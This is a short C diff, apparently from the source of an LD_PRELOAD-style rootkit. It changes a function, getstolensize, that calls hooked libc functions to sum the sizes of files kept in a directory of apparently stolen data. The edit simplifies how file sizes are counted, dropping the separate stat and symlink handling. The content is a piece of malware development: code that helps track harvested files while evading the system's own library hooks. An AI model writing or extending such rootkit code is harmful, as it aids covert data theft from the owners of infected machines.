@@ -2,7 +2,7 @@ off_t getstolensize(void){
     off_t ret=0;
     DIR *dp;
     struct dirent *dir;
-    struct stat sbuf, lsbuf;
+    struct stat sbuf;
 
     hook(COPENDIR, CREADDIR, C__XSTAT, C__LXSTAT);
 
@@ -15,18 +15,12 @@ off_t getstolensize(void){
 
         char path[LEN_INTEREST_DIR+strlen(dir->d_name)+2];
         snprintf(path, sizeof(path), "%s/%s", INTEREST_DIR, dir->d_name);
-        memset(&sbuf, 0, sizeof(struct stat));
-        if((long)call(C__XSTAT, _STAT_VER, path, &sbuf) < 0)
-            continue;
 
-        memset(&lsbuf, 0, sizeof(struct stat));
+        memset(&sbuf, 0, sizeof(struct stat));
         if((long)call(C__LXSTAT, _STAT_VER, path, &sbuf) < 0)
             continue;
 
-        if(S_ISLNK(lsbuf.st_mode))
-            ret = ret+lsbuf.st_size;
-        else
-            ret = ret+sbuf.st_size;
+        ret = ret+sbuf.st_size;
     }
     closedir(dp);
 
